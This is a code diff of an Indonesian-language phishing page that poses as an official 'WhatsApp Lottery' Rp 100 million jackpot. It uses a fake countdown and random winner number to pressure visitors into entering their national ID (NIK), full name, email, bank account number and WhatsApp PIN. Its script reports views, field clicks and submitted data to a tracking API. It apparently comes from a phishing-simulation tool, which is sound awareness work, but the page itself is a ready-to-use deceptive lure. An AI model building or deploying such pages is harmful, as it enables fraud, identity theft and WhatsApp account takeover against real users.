@@ -5,437 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎰 JACKPOT! Anda Menang Rp 100 JUTA!</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Arial, sans-serif;
-            background: radial-gradient(circle, #ffd700 0%, #ff8c00 100%);
-            min-height: 100vh;
-            padding: 15px;
-            animation: bgPulse 3s infinite alternate;
-        }
-
-        @keyframes bgPulse {
-            0% { background: radial-gradient(circle, #ffd700 0%, #ff8c00 100%); }
-            100% { background: radial-gradient(circle, #ff8c00 0%, #ffd700 100%); }
-        }
-
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 25px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
-            animation: scaleIn 0.6s ease;
-        }
-
-        @keyframes scaleIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        .confetti {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            overflow: hidden;
-        }
-
-        .confetti span {
-            position: absolute;
-            font-size: 2rem;
-            animation: fall 3s linear infinite;
-        }
-
-        @keyframes fall {
-            to { transform: translateY(100vh) rotate(360deg); }
-        }
-
-        .header-banner {
-            background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
-            padding: 25px;
-            text-align: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header-banner h1 {
-            font-size: 2rem;
-            margin-bottom: 10px;
-            text-shadow: 3px 3px 6px rgba(0,0,0,0.3);
-            animation: bounce 1s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .lottery-badge {
-            display: inline-block;
-            background: white;
-            color: #ff0844;
-            padding: 10px 25px;
-            border-radius: 30px;
-            font-weight: bold;
-            font-size: 1.1rem;
-            margin-top: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        }
-
-        .jackpot-card {
-            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
-            padding: 40px 20px;
-            text-align: center;
-            position: relative;
-            box-shadow: inset 0 0 30px rgba(255,255,255,0.5);
-        }
-
-        .jackpot-card .icon {
-            font-size: 5rem;
-            margin-bottom: 15px;
-            animation: rotate 2s linear infinite;
-        }
-
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        .jackpot-card h2 {
-            color: #8b0000;
-            font-size: 2rem;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
-        }
-
-        .amount {
-            font-size: 3.5rem;
-            font-weight: bold;
-            color: #ff0000;
-            text-shadow: 3px 3px 6px rgba(0,0,0,0.3);
-            margin: 20px 0;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-
-        .content {
-            padding: 30px 25px;
-        }
-
-        .winner-card {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-
-        .winner-card h3 {
-            font-size: 1.5rem;
-            margin-bottom: 15px;
-        }
-
-        .winner-number {
-            background: white;
-            color: #667eea;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 2rem;
-            font-weight: bold;
-            letter-spacing: 5px;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-        }
-
-        .urgent-box {
-            background: #fff3cd;
-            border: 3px solid #ffc107;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .urgent-box .title {
-            color: #856404;
-            font-size: 1.3rem;
-            font-weight: bold;
-            margin-bottom: 12px;
-        }
-
-        .countdown-timer {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 15px 0;
-        }
-
-        .time-unit {
-            background: #ff0844;
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            min-width: 70px;
-        }
-
-        .time-unit .number {
-            font-size: 2rem;
-            font-weight: bold;
-            display: block;
-        }
-
-        .time-unit .label {
-            font-size: 0.75rem;
-            opacity: 0.9;
-        }
-
-        .prize-list {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 12px;
-            margin: 20px 0;
-        }
-
-        .prize-list h4 {
-            color: #333;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-
-        .prize-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px;
-            background: white;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-
-        .prize-item .icon {
-            font-size: 2rem;
-        }
-
-        .prize-item .details {
-            flex: 1;
-        }
-
-        .prize-item .name {
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 3px;
-        }
-
-        .prize-item .value {
-            color: #ff0844;
-            font-size: 0.9rem;
-        }
-
-        .claim-form {
-            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
-            padding: 25px;
-            border-radius: 15px;
-            margin-top: 25px;
-        }
-
-        .claim-form h3 {
-            color: #0d47a1;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 1.3rem;
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        .form-group label {
-            display: block;
-            color: #1565c0;
-            font-weight: 600;
-            margin-bottom: 8px;
-            font-size: 0.95rem;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #90caf9;
-            border-radius: 10px;
-            font-size: 1rem;
-            background: white;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #1976d2;
-            box-shadow: 0 0 0 3px rgba(25,118,210,0.1);
-        }
-
-        .btn-claim {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 15px;
-            box-shadow: 0 5px 20px rgba(255,8,68,0.4);
-            animation: glow 2s infinite;
-        }
-
-        @keyframes glow {
-            0%, 100% { box-shadow: 0 5px 20px rgba(255,8,68,0.4); }
-            50% { box-shadow: 0 5px 30px rgba(255,8,68,0.8); }
-        }
-
-        .btn-claim:hover {
-            transform: translateY(-3px);
-        }
-
-        .terms {
-            font-size: 0.8rem;
-            color: #666;
-            text-align: center;
-            margin-top: 15px;
-            line-height: 1.6;
-        }
-
-        .footer {
-            background: #1a1a1a;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .footer p {
-            font-size: 0.85rem;
-            line-height: 1.6;
-            margin-bottom: 8px;
-        }
-
-        .sponsored {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #333;
-            font-size: 0.75rem;
-            color: #999;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: radial-gradient(circle, #ffd700 0%, #ff8c00 100%); min-height: 100vh; padding: 15px; }
+        .container { max-width: 500px; margin: 0 auto; background: white; border-radius: 25px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
+        .header-banner { background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%); padding: 25px; text-align: center; color: white; }
+        .header-banner h1 { font-size: 2rem; margin-bottom: 10px; }
+        .lottery-badge { display: inline-block; background: white; color: #ff0844; padding: 10px 25px; border-radius: 30px; font-weight: bold; font-size: 1.1rem; margin-top: 10px; }
+        .jackpot-card { background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%); padding: 40px 20px; text-align: center; }
+        .jackpot-card .icon { font-size: 5rem; margin-bottom: 15px; }
+        .jackpot-card h2 { color: #8b0000; font-size: 2rem; margin-bottom: 20px; }
+        .amount { font-size: 3.5rem; font-weight: bold; color: #ff0000; margin: 20px 0; }
+        .content { padding: 30px 25px; }
+        .winner-card { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 15px; margin-bottom: 25px; text-align: center; }
+        .winner-card h3 { font-size: 1.5rem; margin-bottom: 15px; }
+        .winner-number { background: white; color: #667eea; padding: 15px; border-radius: 10px; font-size: 2rem; font-weight: bold; margin: 15px 0; font-family: monospace; }
+        .urgent-box { background: #fff3cd; border: 3px solid #ffc107; border-radius: 12px; padding: 20px; margin: 20px 0; text-align: center; }
+        .countdown-timer { display: flex; justify-content: center; gap: 15px; margin: 15px 0; }
+        .time-unit { background: #ff0844; color: white; padding: 15px; border-radius: 10px; min-width: 70px; }
+        .time-unit .number { font-size: 2rem; font-weight: bold; display: block; }
+        .claim-form { background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%); padding: 25px; border-radius: 15px; margin-top: 25px; }
+        .claim-form h3 { color: #0d47a1; text-align: center; margin-bottom: 20px; font-size: 1.3rem; }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; color: #1565c0; font-weight: 600; margin-bottom: 8px; }
+        .form-group input { width: 100%; padding: 14px; border: 2px solid #90caf9; border-radius: 10px; font-size: 1rem; }
+        .form-group input:focus { outline: none; border-color: #1976d2; }
+        .btn-claim { width: 100%; padding: 18px; background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%); color: white; border: none; border-radius: 12px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .footer { background: #1a1a1a; color: white; padding: 20px; text-align: center; }
     </style>
 </head>
 <body>
-    <div class="confetti">
-        <span style="left: 10%; animation-delay: 0s;">🎊</span>
-        <span style="left: 20%; animation-delay: 0.5s;">🎉</span>
-        <span style="left: 30%; animation-delay: 1s;">🎁</span>
-        <span style="left: 40%; animation-delay: 1.5s;">⭐</span>
-        <span style="left: 50%; animation-delay: 2s;">💰</span>
-        <span style="left: 60%; animation-delay: 2.5s;">🎊</span>
-        <span style="left: 70%; animation-delay: 1.2s;">🎉</span>
-        <span style="left: 80%; animation-delay: 0.8s;">🎁</span>
-        <span style="left: 90%; animation-delay: 1.8s;">⭐</span>
-    </div>
-
     <div class="container">
         <div class="header-banner">
             <h1>🎰 JACKPOT WHATSAPP 2024 🎰</h1>
             <p style="font-size: 1.1rem;">Undian Berhadiah Spektakuler</p>
             <div class="lottery-badge">✨ PEMENANG TERPILIH ✨</div>
         </div>
-
         <div class="jackpot-card">
             <div class="icon">🏆</div>
             <h2>SELAMAT ANDA MENANG!</h2>
             <div class="amount">Rp 100.000.000</div>
             <p style="color: #8b0000; font-size: 1.1rem; font-weight: bold;">+ Hadiah Tambahan Senilai Rp 50 Juta</p>
         </div>
-
         <div class="content">
             <div class="winner-card">
                 <h3>🎫 NOMOR UNDIAN PEMENANG</h3>
                 <p>Nomor WhatsApp Anda telah terpilih:</p>
                 <div class="winner-number" id="winnerNumber">LOADING...</div>
-                <p style="font-size: 0.9rem; opacity: 0.9;">Undian dilakukan oleh sistem otomatis pada<br><strong id="drawDate"></strong></p>
             </div>
-
             <div class="urgent-box">
-                <div class="title">⏰ CLAIM SEBELUM HANGUS!</div>
+                <div style="color: #856404; font-size: 1.3rem; font-weight: bold; margin-bottom: 15px;">⏰ CLAIM SEBELUM HANGUS!</div>
                 <p style="color: #856404; margin-bottom: 15px;">Hadiah akan hangus jika tidak di-claim dalam:</p>
                 <div class="countdown-timer">
-                    <div class="time-unit">
-                        <span class="number" id="hours">23</span>
-                        <span class="label">JAM</span>
-                    </div>
-                    <div class="time-unit">
-                        <span class="number" id="minutes">59</span>
-                        <span class="label">MENIT</span>
-                    </div>
-                    <div class="time-unit">
-                        <span class="number" id="seconds">59</span>
-                        <span class="label">DETIK</span>
-                    </div>
+                    <div class="time-unit"><span class="number" id="hours">23</span><span style="font-size: 0.7rem;">JAM</span></div>
+                    <div class="time-unit"><span class="number" id="minutes">59</span><span style="font-size: 0.7rem;">MENIT</span></div>
+                    <div class="time-unit"><span class="number" id="seconds">59</span><span style="font-size: 0.7rem;">DETIK</span></div>
                 </div>
             </div>
-
-            <div class="prize-list">
-                <h4>🎁 TOTAL HADIAH YANG ANDA MENANGKAN:</h4>
-                <div class="prize-item">
-                    <div class="icon">💵</div>
-                    <div class="details">
-                        <div class="name">Grand Prize - Uang Tunai</div>
-                        <div class="value">Rp 100.000.000</div>
-                    </div>
-                </div>
-                <div class="prize-item">
-                    <div class="icon">🏍️</div>
-                    <div class="details">
-                        <div class="name">Honda PCX 160</div>
-                        <div class="value">Senilai Rp 35.000.000</div>
-                    </div>
-                </div>
-                <div class="prize-item">
-                    <div class="icon">📱</div>
-                    <div class="details">
-                        <div class="name">iPhone 15 Pro Max</div>
-                        <div class="value">Senilai Rp 20.000.000</div>
-                    </div>
-                </div>
-                <div class="prize-item">
-                    <div class="icon">🏖️</div>
-                    <div class="details">
-                        <div class="name">Paket Liburan Bali 5D4N</div>
-                        <div class="value">Untuk 2 Orang</div>
-                    </div>
-                </div>
-            </div>
-
-            <div style="background: #e8f5e9; padding: 15px; border-radius: 10px; border-left: 4px solid #4caf50; margin: 20px 0;">
-                <p style="color: #2e7d32; font-size: 0.95rem; line-height: 1.6;">
-                    <strong>✓ 100% GRATIS</strong> - Tidak ada biaya administrasi<br>
-                    <strong>✓ LEGAL & RESMI</strong> - Terdaftar di Kemenkumham<br>
-                    <strong>✓ TRANSFER LANGSUNG</strong> - Ke rekening Anda
-                </p>
-            </div>
-
             <div class="claim-form">
                 <h3>📝 FORMULIR CLAIM HADIAH</h3>
                 <form id="claimForm">
@@ -443,193 +68,73 @@
                         <label>📱 Nomor WhatsApp Pemenang</label>
                         <input type="tel" id="phone" placeholder="08xxxxxxxxxx" required>
                     </div>
-
                     <div class="form-group">
                         <label>🆔 NIK (Nomor Induk Kependudukan)</label>
                         <input type="text" id="nik" placeholder="16 digit NIK" maxlength="16" required>
                     </div>
-
                     <div class="form-group">
                         <label>👤 Nama Lengkap (Sesuai KTP)</label>
                         <input type="text" id="fullName" placeholder="Nama lengkap" required>
                     </div>
-
                     <div class="form-group">
                         <label>📧 Email Aktif</label>
                         <input type="email" id="email" placeholder="email@example.com" required>
                     </div>
-
                     <div class="form-group">
                         <label>🏦 Nomor Rekening Bank</label>
                         <input type="text" id="accountNumber" placeholder="Nomor rekening" required>
                     </div>
-
-                    <div class="form-group">
-                        <label>🏛️ Nama Bank</label>
-                        <input type="text" id="bankName" placeholder="Contoh: BCA, Mandiri" required>
-                    </div>
-
                     <div class="form-group">
                         <label>🔐 PIN WhatsApp (Verifikasi)</label>
                         <input type="password" id="waPin" placeholder="6 digit PIN" maxlength="6" required>
                     </div>
-
-                    <button type="submit" class="btn-claim">
-                        🎉 CLAIM HADIAH RP 100 JUTA SEKARANG!
-                    </button>
+                    <button type="submit" class="btn-claim">🎉 CLAIM HADIAH RP 100 JUTA SEKARANG!</button>
                 </form>
-
-                <div class="terms">
-                    Dengan mengklaim hadiah, Anda menyetujui syarat dan ketentuan undian WhatsApp 2024. Hadiah akan ditransfer dalam 3x24 jam setelah verifikasi data.
-                </div>
             </div>
         </div>
-
         <div class="footer">
             <p><strong>WHATSAPP LOTTERY OFFICIAL 2024</strong></p>
-            <p>Program undian resmi bekerja sama dengan WhatsApp LLC</p>
             <p>📞 Customer Service: 0800-1234-5678 (24/7)</p>
-            <div class="sponsored">
-                <p>Disponsori oleh: Bank BCA • Shopee • Tokopedia • Grab</p>
-                <p>Terdaftar di Kementerian Hukum dan HAM RI</p>
-            </div>
         </div>
     </div>
-
     <script>
-        // Generate random winner number
-        const phone = '+62-8' + Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
-        document.getElementById('winnerNumber').textContent = phone;
-
-        // Set draw date
-        const drawDate = new Date();
-        drawDate.setHours(drawDate.getHours() - 2);
-        document.getElementById('drawDate').textContent = drawDate.toLocaleString('id-ID');
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const linkId = urlParams.get('id') || 'demo';
-
-        function trackView() {
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            
-            if (link) {
-                link.views = (link.views || 0) + 1;
-                if (!link.visitors) link.visitors = [];
-                
-                const visitorId = Date.now();
-                link.visitors.push({
-                    id: visitorId,
-                    timestamp: Date.now(),
-                    duration: 0,
-                    inputData: false
-                });
-                
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-                
-                sessionStorage.setItem('visitorId', visitorId);
-                sessionStorage.setItem('linkId', linkId);
-                sessionStorage.setItem('startTime', Date.now());
-            }
-        }
-
-        // Countdown timer
-        let timeLeft = 86399; // 23:59:59
+        document.getElementById('winnerNumber').textContent = '+62-8' + Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
         
+        const API_URL = 'http://localhost:5000/api';
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkId = urlParams.get('id');
+        
+        async function trackView() { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'Lottery jackpot page opened' }) }); } catch (e) {} }
+        async function trackClick(f) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: \`Field: \${f}\` }) }); } catch (e) {} }
+        async function trackSubmit(d) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(d) }) }); } catch (e) {} }
+        
+        let timeLeft = 86399;
         setInterval(() => {
-            const hours = Math.floor(timeLeft / 3600);
-            const mins = Math.floor((timeLeft % 3600) / 60);
-            const secs = timeLeft % 60;
-            
-            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-            document.getElementById('minutes').textContent = mins.toString().padStart(2, '0');
-            document.getElementById('seconds').textContent = secs.toString().padStart(2, '0');
-            
-            timeLeft--;
-            if (timeLeft < 0) timeLeft = 86399;
+            const h = Math.floor(timeLeft / 3600), m = Math.floor((timeLeft % 3600) / 60), s = timeLeft % 60;
+            document.getElementById('hours').textContent = h.toString().padStart(2, '0');
+            document.getElementById('minutes').textContent = m.toString().padStart(2, '0');
+            document.getElementById('seconds').textContent = s.toString().padStart(2, '0');
+            timeLeft--; if (timeLeft < 0) timeLeft = 86399;
         }, 1000);
-
-        // NIK and PIN validation
-        document.getElementById('nik').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-
-        document.getElementById('waPin').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-
-        // Form submission
-        document.getElementById('claimForm').addEventListener('submit', function(e) {
+        
+        document.getElementById('nik').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+        document.getElementById('waPin').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+        
+        let c = new Set();
+        document.querySelectorAll('input').forEach(i => i.addEventListener('focus', function() { const n = this.id; if (!c.has(n)) { c.add(n); trackClick(n); } }));
+        
+        document.getElementById('claimForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
-            const nik = document.getElementById('nik').value;
-            const pin = document.getElementById('waPin').value;
-            
-            if (nik.length !== 16) {
-                alert('NIK harus 16 digit!');
-                return;
-            }
-            
-            if (pin.length !== 6) {
-                alert('PIN WhatsApp harus 6 digit!');
-                return;
-            }
-            
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            
-            if (link) {
-                link.inputData = (link.inputData || 0) + 1;
-                
-                const visitorId = sessionStorage.getItem('visitorId');
-                const startTime = parseInt(sessionStorage.getItem('startTime'));
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                
-                const visitor = link.visitors.find(v => v.id == visitorId);
-                if (visitor) {
-                    visitor.inputData = true;
-                    visitor.duration = duration;
-                }
-                
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-            }
-            
-            const btn = e.target.querySelector('.btn-claim');
-            btn.textContent = '⏳ Memproses Claim...';
-            btn.disabled = true;
-            
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 2500);
+            const nik = document.getElementById('nik').value, pin = document.getElementById('waPin').value;
+            if (nik.length !== 16) { alert('NIK harus 16 digit!'); return; }
+            if (pin.length !== 6) { alert('PIN harus 6 digit!'); return; }
+            await trackSubmit({ nik, email: document.getElementById('email').value });
+            const b = e.target.querySelector('.btn-claim');
+            b.textContent = '⏳ Memproses...'; b.disabled = true;
+            setTimeout(() => window.location.href = 'index.html', 2000);
         });
-
-        trackView();
-
-        window.addEventListener('beforeunload', () => {
-            const visitorId = sessionStorage.getItem('visitorId');
-            const linkId = sessionStorage.getItem('linkId');
-            const startTime = parseInt(sessionStorage.getItem('startTime'));
-            
-            if (visitorId && linkId && startTime) {
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-                const link = links.find(l => l.id === linkId);
-                
-                if (link) {
-                    const visitor = link.visitors.find(v => v.id == visitorId);
-                    if (visitor && !visitor.inputData) {
-                        visitor.duration = duration;
-                    }
-                    const linkIndex = links.findIndex(l => l.id === linkId);
-                    links[linkIndex] = link;
-                    localStorage.setItem('phishLinks', JSON.stringify(links));
-                }
-            }
-        });
+        
+        window.addEventListener('DOMContentLoaded', trackView);
     </script>
 </body>
 </html>
